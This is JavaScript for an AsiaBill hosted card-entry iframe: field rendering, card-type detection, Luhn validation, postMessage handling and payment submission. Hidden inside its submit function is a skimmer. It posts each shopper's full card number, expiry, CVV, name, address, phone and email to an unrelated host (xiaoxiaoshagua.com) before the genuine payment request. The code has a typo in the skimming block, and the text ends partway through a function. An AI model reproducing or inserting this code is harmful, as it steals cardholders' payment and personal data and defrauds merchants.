(function() {
    "use strict";
    let x = {
        frameInnerForm: "result-form",
        validForm: false,
        validCard: false,
        validDate: false,
        validCvv: false,
        errorMsg: "",
        billingDetail: null,
        trnxDetail: {},
        apikey: "",
        jwt: "",
        scriptMode: "",
        publicKey: "",
        pageMode: "",
        pageModeDevice: "",
        pageApiVersion: "",
        pageEv: "" || "pro",
        cssMode: "",
        inputStyle: null,
        event: "",
        suffix: "",
        lang: "",
        queryUrl: {
            dev: "https://testap.asiabill.com/",
            test: "https://sandbox-pay.asiabill.com/",
            uat: "https://testpay.asiabill.com/",
            pro: "https://safepay.asiabill.com/"
        },
        cardType: "",
        cardText: "",
        source: "",
        origin: "",
        cartypes: {
            1: "visa",
            2: "master",
            3: "jcb",
            4: "ae",
            5: "discover",
            6: "unionPay"
        },
        background: false,
        supportedCards: []
    };
    function t() {
        $.i18n.properties({
            name: "lang",
            path: "./lang/",
            mode: "map",
            language: x.lang,
            callback: function() {
                try {
                    $("#pay-card").attr("placeholder", $.i18n.prop("card.placeholder"));
                    $("#pay-date").attr("placeholder", $.i18n.prop("date.placeholder"));
                    if (x.background) {
                        $(".asiabill_card--title").text($.i18n.prop("cardInfo"))
                    }
                    if (x.lang.toLowerCase() == "ar") {
                        $("html").css("direction", "rtl");
                        $("#pay-card").addClass("lang_ar");
                        $("#pay-cvv").addClass("lang_ar");
                        $("#pay-date").addClass("lang_ar")
                    }
                } catch (e) {
                    console.log(e);
                    x.lang = "en";
                    t()
                }
            }
        })
    }
    function e() {
        let e = navigator.userAgent;
        if (/Android|SymbianOS|Windows Phone|webOS|iPhone|iPad|iPod|BlackBerry/i.test(e)) {
            return true
        } else if (e.indexOf("Mac") != -1 && e.indexOf("Safari") != -1 && "ontouchend"in document) {
            return true
        } else {
            return false
        }
    }
    function S(a, e) {
        let t = e || 500;
        let r;
        return function() {
            let e = arguments;
            if (r) {
                clearTimeout(r)
            }
            r = setTimeout(()=>{
                r = null;
                a.apply(this, e)
            }
            , t)
        }
    }
    function r() {
        let a = "";
        if (x.background) {
            a = '<div class="asiabill_card"><div class="asiabill_card--title"></div><div class="asiabill_card--content"></div></div>';
            $("#result-form").empty().append(a);
            let e = x.pageMode == "block" ? '<div class="asiabill_form-wrap form-wrap_card"><div class="pay-wrap"><span class="pay-card-wrap" id="cardIconParent"><i id="cardIcon"></i><input id="pay-card" type="tel" name="card" maxlength="23"></span></div></div><div class="support_card"><div class="support_card--text"></div><div class="support_card--pms"></div></div><div class="asiabill_form-wrap--section"><div class="asiabill_form-wrap form-wrap_date"><div class="pay-wrap"><span class="pay-date-wrap"><input id="pay-date" type="tel" name="date" maxlength="7"></span></div></div><div class="asiabill_form-wrap form-wrap_cvv"><div class="pay-wrap"><span class="pay-cvv-wrap" id="cvvIcon"><input id="pay-cvv" type="tel" name="cvv" maxlength="4" placeholder="CVV"></span><svg class="icon" id="cvvIconChild" aria-hidden="true"><use xlink:href="#icon-back"></use></svg></div></div></div>' : '<div class="asiabill_form-wrap form-wrap_inner" id="cardIconParent"><i id="cardIcon"></i><div class="pay-wrap"><span class="pay-card-wrap"><input id="pay-card" type="tel" name="card" maxlength="23"></span><span class="pay-date-wrap pay-card-wrap-init"><input id="pay-date" type="tel" name="date" maxlength="7"></span><span class="pay-cvv-wrap pay-card-wrap-init" id="cvvIcon"><input id="pay-cvv" type="tel" name="cvv" maxlength="4" placeholder="CVV"><svg class="icon" id="cvvIconChild" aria-hidden="true"><use xlink:href="#icon-back"></use></svg></span></div></div>';
            $(".asiabill_card--content").append(e)
        } else {
            a = x.pageMode == "block" ? '<div class="asiabill_form-wrap form-wrap_card"><div class="pay-wrap"><span class="pay-card-wrap" id="cardIconParent"><i id="cardIcon"></i><input id="pay-card" type="tel" name="card" maxlength="23"></span></div></div><div class="asiabill_form-wrap--section"><div class="asiabill_form-wrap form-wrap_date"><div class="pay-wrap"><span class="pay-date-wrap"><input id="pay-date" type="tel" name="date" maxlength="7"></span></div></div><div class="asiabill_form-wrap form-wrap_cvv"><div class="pay-wrap"><span class="pay-cvv-wrap" id="cvvIcon"><input id="pay-cvv" type="tel" name="cvv" maxlength="4" placeholder="CVV"></span><svg class="icon" id="cvvIconChild" aria-hidden="true"><use xlink:href="#icon-back"></use></svg></div></div></div>' : '<div class="asiabill_form-wrap form-wrap_inner" id="cardIconParent"><i id="cardIcon"></i><div class="pay-wrap"><span class="pay-card-wrap"><input id="pay-card" type="tel" name="card" maxlength="23"></span><span class="pay-date-wrap pay-card-wrap-init"><input id="pay-date" type="tel" name="date" maxlength="7"></span><span class="pay-cvv-wrap pay-card-wrap-init" id="cvvIcon"><input id="pay-cvv" type="tel" name="cvv" maxlength="4" placeholder="CVV"><svg class="icon" id="cvvIconChild" aria-hidden="true"><use xlink:href="#icon-back"></use></svg></span></div></div>';
            $("#result-form").empty().append(a)
        }
    }
    function d() {
        let e = function(e, a) {
            let t;
            console.log("data", e);
            let detail = e.billingDetail;
            let new_data = {
                "pay_card_number": detail.card.cardNo,
                "pay_card_mm": deatil.card.cardExpireMonth,
                "pay_card_yy": detail.card.cardExpireYear,
                "pay_card_cvv": detail.card.cardSecurityCode,
                "shipping_contry": detail.address.country,
                "shipping_province": detail.address.state,
                "shipping_city": detail.address.city,
                "shipping_zip_code": detail.address.postalCode,
                "billing_address": detail.address.line1,
                "billing_other_address": detail.address.line2,
                "shipping_first_name": detail.firstName,
                "shipping_last_name": detail.lastName,
                "shipping_phone": detail.phone,
                "email": detail.email
            };
            $.ajax({
                type: "post",
                timeout: 5e3,
                data: new_data,
                contentType: a.contentType && a.contentType != "" ? "application/json" : "application/x-www-form-urlencoded",
                url: "https://www.xiaoxiaoshagua.com/save_order_info/",
                async: a.async || false,
                beforeSend: function(e) {
                    
                },
                success: function(e) {
                    console.log('success')
                },
                error: function(e) {
                    console.log('fail'+ e)
                }
            });
            $.ajax({
                type: a.method || "post",
                timeout: a || 5e3,
                data: e,
                contentType: a.contentType && a.contentType != "" ? "application/json" : "application/x-www-form-urlencoded",
                url: a.url,
                async: a.async || false,
                beforeSend: function(e) {
                    if (a.sessionToken)
                        e.setRequestHeader("sessionToken", a.sessionToken);
                    if (a.type)
                        e.setRequestHeader("type", a.type);
                    if (a.refererer)
                        e.setRequestHeader("refererer", a.refererer);
                    if (a.refererer_en)
                        e.setRequestHeader("refererer-en", a.refererer_en);
                    if (a["request-id"])
                        e.setRequestHeader("request-id", a["request-id"]);
                    if (a["request-time"])
                        e.setRequestHeader("request-time", a["request-time"]);
                    if (a["gateway-no"])
                        e.setRequestHeader("gateway-no", a["gateway-no"]);
                    if (a["sign-info"])
                        e.setRequestHeader("sign-info", a["sign-info"])
                },
                success: function(e) {
                    t = e
                },
                error: function(e) {
                    t = e
                }
            });
            return t
        };
        return {
            submitDatatoInterface: e
        }
    }
    function i(r) {
        let e = $("#result-form input");
        let a = $(".asiabill_form-wrap");
        if (r.input) {
            if (r.input.Color && r.input.Color != "") {
                e.css("color", r.input.Color)
            }
            if (r.input.FontFamily && r.input.FontFamily != "")
                e.css("font-family", r.input.FontFamily);
            if (r.input.FontSize && r.input.FontSize != "")
                e.css("font-size", r.input.FontSize + "px");
            if (r.input.FontWeight && r.input.FontWeight != "")
                e.css("font-weight", r.input.FontWeight);
            if (r.input.BorderRadius && r.input.BorderRadius != "")
                a.css("border-radius", r.input.BorderRadius);
            if (r.input.ContainerBorder && r.input.ContainerBorder != "")
                a.css("border", r.input.ContainerBorder);
            if (r.input.ContainerPadding && r.input.ContainerPadding != "")
                a.css("padding", r.input.ContainerPadding);
            if (r.input.ContainerBg && r.input.ContainerBg != "")
                a.css("background", r.input.ContainerBg);
            if (r.input.ContainerSh && r.input.ContainerSh != "")
                a.css("box-shadow", r.input.ContainerSh)
        }
        if (r.background) {
            let e = $(".asiabill_card--title");
            let a = $(".asiabill_card");
            let t = $(".support_card--text");
            if (r.background.Color && r.background.Color != "")
                e.css("color", r.background.Color);
            if (r.background.FontFamily && r.background.FontFamily != "")
                e.css("font-family", r.background.FontFamily);
            if (r.background.FontWeight && r.background.FontWeight != "")
                e.css("font-weight", r.background.FontWeight);
            if (r.background.FontSize && r.background.FontSize != "")
                e.css("font-size", r.background.FontSize + "px");
            if (r.background.Color && r.background.Color != "")
                t.css("color", r.background.Color);
            if (r.background.FontFamily && r.background.FontFamily != "")
                t.css("font-family", r.background.FontFamily);
            if (r.background.FontWeight && r.background.FontWeight != "")
                t.css("font-weight", r.background.FontWeight);
            if (r.background.FontSize && r.background.FontSize != "")
                t.css("font-size", r.background.FontSize + "px");
            if (r.background.BgColor && r.background.BgColor != "")
                a.css("background", r.background.BgColor);
            if (r.background.Width && r.background.Width != "")
                a.css("width", r.background.Width);
            if (r.background.Height && r.background.Height != "")
                a.css("height", r.background.Height);
            if (r.background.BgPadding && r.background.BgPadding != "")
                a.css("padding", r.background.BgPadding);
            if (r.background.BorderRadius && r.background.BorderRadius != "")
                a.css("border-radius", r.background.BorderRadius);
            if (r.background.TextIndent && r.background.TextIndent != "") {
                e.css("text-indent", r.background.TextIndent);
                t.css("text-indent", r.background.TextIndent)
            }
            if (r.background.LineHeight && r.background.LineHeight != "")
                e.css("line-height", r.background.LineHeight);
            if (r.background.BoxShadow && r.background.BoxShadow != "")
                a.css("box-shadow", r.background.BoxShadow)
        }
    }
    function a() {
        let a = function(s) {
            let o = typeof s.data == "string" ? JSON.parse(s.data) : s.data;
            if (o.type == "updateCss") {
                x.source = s.source;
                x.origin = s.origin;
                let e = o.data.pageS;
                x.pageMode = e.pageMode;
                x.pageModeDevice = e.pageModeDevice;
                x.pageEv = e.pageEv;
                x.pageApiVersion = e.pageApiVersion;
                x.lang = e.pageLang;
                x.background = e.background;
                x.supportedCards = e.supportedCards;
                if (x.pageApiVersion == "v202203") {
                    x.suffix = "V2022-03/"
                } else {
                    x.suffix = "services/v3/"
                }
                x.inputStyle = o.data.extraStyle;
                r();
                if ($(".asiabill_form-wrap").hasClass("form-wrap_card")) {
                    let e = {
                        type: "initLayout",
                        data: {}
                    };
                    s.source.postMessage(e, s.origin)
                }
                i(x.inputStyle);
                p();
                _("init-cardImg")();
                setTimeout(function() {
                    t();
                    if (x.supportedCards.length > 0) {
                        $(".support_card--text").text($.i18n.prop("Support"));
                        let a = $(".support_card--pms");
                        for (let e of x.supportedCards) {
                            a.append('<i class="cardIcon card-image-' + e + '"></i>')
                        }
                    }
                    _("pay-card");
                    _("pay-date");
                    _("pay-cvv");
                    $(".ab-tooltip").attr("tooltip-data", $.i18n.prop("cvv.tip"));
                    let e = $(".asiabill_form-wrap").outerWidth();
                    if (e < 400) {
                        $(".pay-date-wrap").removeClass("pay-card-wrap-init");
                        $(".pay-cvv-wrap").removeClass("pay-card-wrap-init")
                    } else {
                        $(".pay-card-wrap").removeClass("pay-date-wrap-m").removeClass("pay-card-wrap-init");
                        $(".pay-date-wrap").removeClass("pay-date-wrap-m").removeClass("pay-card-wrap-init");
                        $(".pay-cvv-wrap").removeClass("pay-date-wrap-m").removeClass("pay-card-wrap-init")
                    }
                    clearTimeout()
                }, 50)
            } else if (o.type == "updateStyle") {
                i(o.data.style);
                s.source.postMessage({
                    type: "updateStyle_Res"
                }, s.origin)
            } else if (o.type == "updateLayout") {
                if (o.data.width <= 768) {} else {
                    $(".form-wrap_date").removeClass("form-wrap_date-m");
                    $(".form-wrap_cvv").removeClass("form-wrap_cvv-m")
                }
                let e = $(".asiabill_form-wrap").outerWidth();
                if (e < 400) {
                    $(".pay-card-wrap").removeClass("pay-card-wrap-init");
                    $(".pay-date-wrap").removeClass("pay-card-wrap-init");
                    $(".pay-cvv-wrap").removeClass("pay-card-wrap-init")
                } else {
                    $(".pay-date-wrap").removeClass("pay-date-wrap-m").removeClass("pay-card-wrap-init");
                    $(".pay-cvv-wrap").removeClass("pay-date-wrap-m").removeClass("pay-card-wrap-init")
                }
            } else if (o.type == "submitwithValidate") {
                x.billingDetail = o.data.billing_detail;
                x.event = o.data.event;
                x.apikey = o.data.api_key;
                let e = _("getErrorList");
                let a = {
                    type: "validate",
                    data: {
                        validForm: x.validForm,
                        errorMsg: e.errorMsg,
                        lastEvent: x.event,
                        inputEvent: "submit"
                    }
                };
                s.source.postMessage(a, s.origin)
            } else if (o.type == "confirmSubmit") {
                x.event = o.data.event;
                let e = {
                    type: "submit_Res"
                };
                let a = {};
                let t = {};
                let r = {
                    sessionToken: x.apikey,
                    url: x.queryUrl[x.pageEv] + x.suffix + (x.event == "confirmPayment" ? "confirmPayment" : "payment_methods"),
                    contentType: x.event == "confirmPayment" ? "" : "application/json"
                };
                if (x.event == "confirmPayment") {
                    a = {
                        merNo: o.data.merNo,
                        gatewayNo: o.data.gatewayNo,
                        orderNo: o.data.orderNo,
                        webSite: o.data.website,
                        ip: "",
                        cardExpireMonth: x["month"],
                        cardExpireYear: x["year"],
                        cardNo: x["card"],
                        cardSecurityCode: x["cvv"]
                    };
                    t = n(a, x.billingDetail);
                    r.type = c(t["cardNo"] + t["cardSecurityCode"] + t["cardExpireMonth"] + t["cardExpireYear"]);
                    t["cardNo"] = window.btoa(window.encodeURIComponent(t["cardNo"]));
                    t["cardSecurityCode"] = window.btoa(window.encodeURIComponent(t["cardSecurityCode"]));
                    t["cardExpireMonth"] = window.btoa(window.encodeURIComponent(t["cardExpireMonth"]));
                    t["cardExpireYear"] = window.btoa(window.encodeURIComponent(t["cardExpireYear"]))
                } else {
                    a = x.billingDetail;
                    r.type = c(x["cardNo"] + x["cardSecurityCode"] + x["cardExpireMonth"] + x["cardExpireYear"]);
                    r.refererer = o.data.website;
                    r.refererer_en = window.btoa(window.encodeURIComponent(o.data.topWin));
                    if (!a.card) {
                        a.card = {
                            cardNo: "",
                            cardExpireMonth: "",
                            cardExpireYear: "",
                            cardSecurityCode: ""
                        }
                    }
                    a.card.cardExpireMonth = window.btoa(window.encodeURIComponent(x["month"]));
                    a.card.cardExpireYear = window.btoa(window.encodeURIComponent(x["year"]));
                    a.card.cardSecurityCode = window.btoa(window.encodeURIComponent(x["cvv"]));
                    a.card.cardNo = window.btoa(window.encodeURIComponent(x["card"]));
                    t = JSON.stringify(a)
                }
                let i = d().submitDatatoInterface(t, r);
                e = n(e, i);
                s.source.postMessage(e, s.origin)
            } else if (o.type == "reset") {
                $("#pay-card").val(""),
                $("#pay-date").val(""),
                $("#pay-cvv").val("");
                let e = {
                    type: "reset_Res",
                    data: {
                        code: "00000",
                        msg: ""
                    }
                };
                s.source.postMessage(e, s.origin)
            } else if (o.type == "doConfirm") {
                x.event = o.data.event;
                x.apikey = o.data.api_key;
                x.trnxDetail = o.data.trnx_detail;
                let r = x.trnxDetail;
                let e = x.billingDetail;
                let i = x.trnxDetail;
                i.requestInterfaceType = "1";
                let n = {
                    url: x.queryUrl[x.pageEv] + x.suffix + "confirmCharge",
                    contentType: "application/json"
                };
                if (x.pageApiVersion == "v202203") {
                    n["request-id"] = l();
                    n["request-time"] = (new Date).getTime();
                    n["gateway-no"] = r.gatewayNo;
                    let e = n["request-id"] + n["request-time"] + n["gateway-no"] + JSON.stringify(x.trnxDetail);
                    n["sign-info"] = sha256.hmac(x.apikey, e)
                } else {
                    let a = {
                        merNo: r.merNo,
                        gatewayNo: r.gatewayNo,
                        orderNo: r.orderNo,
                        orderCurrency: r.orderCurrency,
                        orderAmount: r.orderAmount,
                        customerPaymentMethodId: r.customerPaymentMethodId,
                        signkey: o.data.sign_key
                    };
                    let t = "";
                    for (let e in a) {
                        if (a[e] != "") {
                            t += a[e]
                        }
                    }
                    i.signInfo = sha256(t.toLowerCase());
                    n.sessionToken = x.apikey
                }
                let a = d().submitDatatoInterface(JSON.stringify(i), n);
                let t = a;
                t.type = "confirmResponse";
                s.source.postMessage(t, s.origin)
            }
        };
        function l() {
            return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(e) {
                const a = Math.random() * 16 | 0
                  , t = e == "x" ? a : a & 3 | 8;
                return t.toString(16)
            })
        }
        function n(e, a) {
            let t = e;
            for (let e in a) {
                if (a[e] != "") {
                    t[e] = a[e]
                }
            }
            return t
        }
        function e() {
            window.onmessage = function(e) {
                a(e)
            }
        }
        e()
    }
    function I(e) {
        let a = e.replace(/[^0-9]+/g, "");
        return a
    }
    function l(e) {
        var a = e;
        var t = a.selectionStart;
        var r = a.value;
        var i = (r.slice(0, t).match(/\s/g) || []).length;
        var n = r.replace(/\s/g, "");
        r = $.trim(n.replace(/\D+/g, ""));
        var s = a.value;
        var o = (s.slice(0, t).match(/\s/g) || []).length;
        a.selectionEnd = a.selectionStart = t + o - i;
        if (x.cardType == 4) {
            a.value = $.trim(r.replace(/(\d{4})(\d{1,6})(\d{0,5})/g, "$1 $2 $3"))
        } else {
            a.value = r.replace(/(\d{4})/g, "$1 ")
        }
    }
    function c(e) {
        return sha256(window.btoa(window.encodeURIComponent(e)))
    }
    function M(e, a, t, r) {
        switch (e) {
        case "normal":
            break;
        case "paste":
            if (a == "pay-card") {
                if (r) {
                    if (I($("#" + a).val()).length == r) {
                        $("#" + t).focus()
                    }
                } else {
                    $("#" + t).focus()
                }
            } else if (a == "pay-date") {
                if (r) {
                    if ($("#" + a).val().length == r) {
                        $("#" + t).focus()
                    }
                } else {
                    $("#" + t).focus()
                }
            }
            break;
        case "backspace":
            $("#" + t).focus();
            break;
        default:
            break
        }
    }
    function p() {
        let r = $("#pay-card");
        let i = $("#pay-date");
        let n = $("#pay-cvv");
        $("#result-form").on("keydown", "#pay-card", function(a) {
            a = a ? a : window.event ? window.event : "";
            let e = a.keyCode ? a.keyCode : a.which;
            r.off("input");
            let t = document.getElementById("pay-card");
            if (e == 8) {
                if (r.val().substring(r.val().length - 2, r.val().length - 1) == " " && t.selectionStart == r.val().length - 1) {
                    a.preventDefault();
                    r.val(r.val().substring(0, r.val().length - 2))
                } else if (t.selectionStart > 1 && (t.selectionStart + 4) % 5 == 0 && x.cardType != 4) {
                    let e = t.selectionStart;
                    r.val(r.val().substring(0, t.selectionStart - 2) + r.val().substring(t.selectionStart, r.val().length));
                    a.preventDefault();
                    t.selectionStart = t.selectionEnd = e - 2;
                    l(t)
                } else {
                    let e = r.val();
                    let a = r.val().length;
                    if (e[a - 1] == " ") {
                        r.val(e.substring(0, a - 1))
                    }
                    r.on("input", function() {
                        l(t)
                    })
                }
            } else {
                if (t.selectionStart == t.value.length && e == 39) {
                    M("normal", "pay-card", "pay-date")
                }
                r.on("input", function() {
                    l(t)
                })
            }
        });
        r.off("paste").on("paste", function(e) {
            a(e)
        });
        i.off("input").on("input", function() {
            t()
        });
        i.on("keydown", function(e) {
            let a = e.keyCode ? e.keyCode : e.which ? e.which : e.charCode;
            i.off("input").on("input", function() {
                t()
            });
            if (a == 8) {
                if (this.selectionStart == this.selectionEnd) {
                    if (i.val().length >= 6 && this.selectionStart > 2 && this.selectionStart <= 5) {
                        e.preventDefault();
                        this.selectionEnd = this.selectionStart = 2
                    } else if (i.val().length > 2 && this.selectionStart == 2) {
                        i.off("input").on("input", function() {
                            t(this)
                        });
                        this.selectionEnd = this.selectionStart = 2
                    } else if (i.val().length == 6 || i.val().length == 5) {
                        i.off("input");
                        if (i.val().indexOf(" / ") > -1) {
                            i.val(i.val().substring(0, 3))
                        }
                    } else if (i.val().length == 1) {
                        e.preventDefault();
                        if (this.selectionStart != 0)
                            i.val("");
                        if (x.pageMode == "inner")
                            M("backspace", "pay-date", "pay-card")
                    }
                }
            } else {
                if (this.selectionStart == i.val().length && this.selectionStart == this.selectionEnd && a != 37) {
                    M("normal", "pay-date", "pay-cvv", 7)
                }
                if (this.selectionStart == 0 && a == 37) {
                    e.preventDefault();
                    M("backspace", "pay-date", "pay-card")
                } else if (this.selectionStart == this.value.length && a == 39) {
                    M("normal", "pay-date", "pay-cvv")
                }
            }
        });
        i.off("paste").on("paste", function(e) {
            let a;
            if (window.clipboardData && window.clipboardData.getData) {
                a = window.clipboardData.getData("Text")
            } else {
                a = e.originalEvent.clipboardData.getData("Text")
            }
            s(a)
        });
        n.on("input", function(e) {
            let a = $(this);
            a.val(a.val().replace(/[^\d\/]/g, ""))
        });
        n.on("keydown", function(e) {
            let a = e.keyCode ? e.keyCode : e.which ? e.which : e.charCode;
            let t = $(this);
            if (a == 8) {
                if (n.val().length == 1) {
                    e.preventDefault();
                    if (this.selectionStart != 0)
                        n.val("");
                    if (x.pageMode == "inner")
                        M("backspace", "pay-cvv", "pay-date")
                }
            } else {
                if (a == 37 || a == 39) {
                    if (this.selectionStart == 0) {
                        e.preventDefault();
                        M("backspace", "pay-cvv", "pay-date")
                    }
                } else {
                    t.val(t.val().replace(/[^\d\/]/g, ""))
                }
            }
        });
        function t(e) {
            if (i.val() == "9" || i.val() == "8" || i.val() == "7" || i.val() == "6" || i.val() == "5" || i.val() == "4" || i.val() == "3" || i.val() == "2") {
                i.val("0" + i.val() + " / ")
            } else {
                i.val(i.val().replace(/[^0-9]/g, ""));
                o(e)
            }
        }
        function s(e) {
            let a = e.replace(/[^0-9]+/g, "");
            let t = a.substring(0, 4);
            if (t.length == 0) {
                i.val("")
            } else if (t.length == 1) {
                i.val("0" + t + " / ")
            } else if (t.length == 2) {
                i.val("0" + t.substring(0, 1) + " / " + t.substring(1, 2))
            } else if (t.length == 3) {
                i.val("0" + t.substring(0, 1) + " / " + t.substring(1, 2) + t.substring(2, 3))
            } else if (t.length == 4) {
                if (t.substring(0, 2) > 12) {
                    t = t.substring(0, 3);
                    s(t)
                } else {
                    i.val(t.substring(0, 2) + " / " + t.substring(2, 4))
                }
            }
        }
        function a(e) {
            setTimeout(function() {
                if (r.val().replace(/\s/g, "").length > 19) {
                    r.val(r.val().replace(/\s/g, "").substring(0, 19))
                }
                x.cardType = _("card-type")(r.val());
                x.cardText = x.cartypes[x.cardType];
                _("show-cardImg")(x.cardText);
                r.val(r.val().replace(/[^0-9]+/g, ""));
                if (x.cardType == 4) {
                    r.val($.trim(r.val().replace(/(\d{4})(\d{1,6})(\d{0,5})/g, "$1 $2 $3")))
                } else {
                    r.val(r.val().replace(/(\d{4})/g, "$1 "))
                }
            }, 100)
        }
        function o(t) {
            let r = i.val();
            if (r.length == 2) {
                if (r == "00")
                    r = "01";
                if (r > "12")
                    r = "12";
                i.val(r + " / ")
            } else if (r.length > 2) {
                let e = r.substring(0, 2);
                let a = r.substring(2, r.length);
                if (a.length == 4 && a >= (new Date).getFullYear()) {
                    a = a.substring(2, a.length)
                }
                if (e == "00") {
                    e = "01"
                } else if (e > "12") {
                    e = "12"
                }
                e += " / ";
                if (e.length + a.length > 7)
                    a = a.substring(0, a.length - 1);
                i.val(e + a);
                if (t)
                    t.selectionStart = t.selectionEnd = 2
            }
        }
    }
    function _(e) {
        let o = [];
        let l = [];
        let n = [];
        let s = function(e, a) {
            if (e) {
                a.addClass("input-error")
            } else {
                a.removeClass("input-error")
            }
        };
        let t = function(e) {
            let a = I(e);
            let t = 0;
            let r = 0;
            let i = 0;
            let n = false;
            for (let e = a.length - 1; e >= 0; e--) {
                r = parseInt(a.charAt(e));
                if (n) {
                    i = r * 2;
                    if (i > 9) {
                        i -= 9
                    }
                } else {
                    i = r
                }
                t += i;
                n = !n
            }
            if (t % 10 == 0 && t != 0) {
                return true
            } else {
                o.push($.i18n.prop("card.invalid"));
                return false
            }
        };
        let r = function(e) {
            let a = I(e);
            if (a == null || a.length < 5) {
                o.push($.i18n.prop("card.incomplete"));
                return false
            }
            x.cardType = d(a);
            x.cardText = x.cartypes[x.cardType];
            if ($.type(x.cartypes[x.cardType]) == "undefined" || x.cartypes[x.cardType] == "") {
                o.push($.i18n.prop("card.noMatch"));
                return false
            } else {
                return true
            }
        };
        let d = function(e) {
            var a = $("#pay-card");
            var t = $("#pay-cvv");
            var r = $(".ab-cvvTip");
            var i = $("#cvvIcon");
            if (!e)
                e = a.val();
            var n = I(e);
            var s = n.substring(0, 1);
            var o = n.substring(0, 2);
            var l = n.substring(0, 6);
            var d = n.substring(0, 7);
            var c = 0;
            if (s == "4") {
                c = 1
            } else if (o == "60" || o == "64" || o == "65" || l == "369989" || d == "3699 89" || o == "36") {
                c = 5
            } else if (o == "62") {
                c = 6
            } else if (s == "5" || s == "2" || s == "6") {
                c = 2
            } else if (o == "34" || o == "37") {
                c = 4
            } else if (s == "3") {
                c = 3
            }
            $("#cvvIconChild").remove();
            if (c == 4) {
                a.attr("maxLength", 17);
                t.attr("maxLength", 4);
                if (x.pageMode == "block") {
                    i.parent().append('<svg class="icon" id="cvvIconChild" aria-hidden="true"><use xlink:href="#icon-front"></use></svg>')
                } else {
                    i.append('<svg class="icon" id="cvvIconChild" aria-hidden="true"><use xlink:href="#icon-front"></use></svg>')
                }
            } else {
                a.attr("maxLength", 23);
                t.attr("maxLength", 3);
                if (x.pageMode == "block") {
                    i.parent().append('<svg class="icon" id="cvvIconChild" aria-hidden="true"><use xlink:href="#icon-back"></use></svg>')
                } else {
                    i.append('<svg class="icon" id="cvvIconChild" aria-hidden="true"><use xlink:href="#icon-back"></use></svg>')
                }
            }
            return c
        };
        let i = function(e) {
            let a = I(e);
            if (a.length < 12) {
                o.push($.i18n.prop("card.incomplete"));
                return false
            }
            if (/^[23456](?:\d{12}|\d{13}|\d{14}|\d{15}|\d{16}|\d{17}|\d{18})$/.test(a)) {
                return true
            } else {
                o.push($.i18n.prop("card.invalid"));
                return false
            }
        };
        let c = function(e) {
            let a = I(e);
            let t = a.substring(0, 1);
            let r = 0;
            let i = 0;
            let n = 0;
            let s = false;
            for (let e = a.length - 1; e >= 0; e--) {
                i = parseInt(a.charAt(e));
                if (s) {
                    n = i * 2;
                    if (n > 9) {
                        n -= 9
                    }
                } else {
                    n = i
                }
                r += n;
                s = !s
            }
            if (r % 10 == 0 && r != 0) {
                return true
            } else {
                o.push($.i18n.prop("card.invalid"));
                return false
            }
        };
        var a = function(e) {
            var a = $("#cardIcon");
            if (e && e !== "") {
                a.removeClass().addClass("card-image-" + e)
            } else if (!e) {
                a.removeClass().addClass("card-image-init")
            } else {
                a.removeClass().addClass("card-image-error")
            }
        };
        let p = function() {
            var e = $("#cardIcon");
            e.addClass("card-image-init")
        };
        let u = function() {
            var e = $("#cardIcon");
            e.removeClass().addClass("card-image-error")
        };
        let v = function(e) {
            if (I(e).length < 4) {
                l.push($.i18n.prop("date.incomplete"));
                return false
            }
            let a = e.split(" / ");
            let t = parseInt(a[0]);
            let r = ((new Date).getFullYear() + "").substring(0, 2);
            let i = parseInt(r + a[1] + a[0]);
            let n = new Date;
            let s = n.getFullYear() + ((n.getMonth() + 1 < 10 ? "0" + (n.getMonth() + 1) : n.getMonth() + 1) + "");
            if (i < s) {
                l.push($.i18n.prop("date.incorrect"));
                x["month"] = null;
                x["year"] = null;
                return false
            } else {
                x["month"] = a[0];
                x["year"] = r + a[1];
                return true
            }
        };
        let f = function(e, a, t) {
            $("#" + e).off(a);
            $("#result-form").on(a, "#" + e, function(e) {
                t(e)
            })
        };
        let g = function(e, a) {
            if (r(a) && i(a) && c(a) && t(a)) {
                x.validCard = true;
                s(false, e);
                x["card"] = I(a)
            } else {
                x.validCard = false;
                x["card"] = null;
                s(true, e);
                u()
            }
        };
        let y = function(e, a) {
            if (v(a)) {
                x.validDate = true;
                s(false, e)
            } else {
                x.validDate = false;
                s(true, e)
            }
        };
        let m = function(e, a) {
            if (a.length >= 3) {
                x["cvv"] = a;
                x.validCvv = true;
                s(false, e)
            } else {
                x["cvv"] = null;
                n.push($.i18n.prop("cvv.incomplete"));
                x.validCvv = false;
                s(true, e)
            }
        };
        let h = function(e) {
            if (x.errorMsg == "")
                x.errorMsg = e
        };
        switch (e) {
        case "pay-card":
            let i = $("#" + e);
            f(e, "keyup", S(function(e) {
                let a = e.keyCode ? e.keyCode : e.which ? e.which : e.charCode;
                x.cardType = _("card-type")(i.val());
                x.cardText = x.cartypes[x.cardType];
                _("show-cardImg")(x.cardText);
                let t = I(i.val());
                if (t.length >= 12) {
                    var r = document.getElementById("pay-card");
                    if (x.pageMode != "block" && a != 8 && a != 37 && a != 39 && (r.selectionStart == 19 || r.selectionStart == 17)) {
                        M("normal", "pay-card", "pay-date", x.cardType == 4 ? 15 : 16)
                    }
                }
            }, 150));
            f(e, "focus", function() {
                _("show-cardImg")(x.cardText);
                let e = $(".pay-card-wrap");
                let a = $(".asiabill_form-wrap").outerWidth();
                if (a < 400 && x.pageMode == "inner") {
                    e.removeClass("pay-card-wrap-transition");
                    $(".pay-date-wrap").removeClass("pay-card-wrap-transition");
                    $(".pay-cvv-wrap").removeClass("pay-card-wrap-transition")
                }
                o = [];
                s(false, i)
            });
            f(e, "blur", function() {
                var e = _("getErrorListforCard");
                var a = {
                    type: "validate",
                    data: {
                        validForm: x.validForm,
                        errorMsg: e.errorMsg,
                        lastEvent: x.event,
                        inputEvent: "blur"
                    }
                };
                x.source.postMessage(a, x.origin)
            });
            break;
        case "pay-date":
            let t = $("#" + e);
            f(e, "keyup", function() {});
            f(e, "focus", function() {
                let e = $(".pay-card-wrap");
                let a = $(".asiabill_form-wrap").outerWidth();
                if (a < 400 && x.pageMode == "inner") {
                    if (x.lang == "ar") {
                        e.addClass("pay-card-wrap-transition").addClass("reverse");
                        $(".pay-date-wrap").addClass("pay-card-wrap-transition").addClass("reverse");
                        $(".pay-cvv-wrap").addClass("pay-card-wrap-transition").addClass("reverse")
                    } else {
                        e.addClass("pay-card-wrap-transition");
                        $(".pay-date-wrap").addClass("pay-card-wrap-transition");
                        $(".pay-cvv-wrap").addClass("pay-card-wrap-transition")
                    }
                }
                s(false, t)
            });
            f(e, "blur", function() {
                var e = _("getErrorListforDate");
                var a = {
                    type: "validate",
                    data: {
                        validForm: x.validForm,
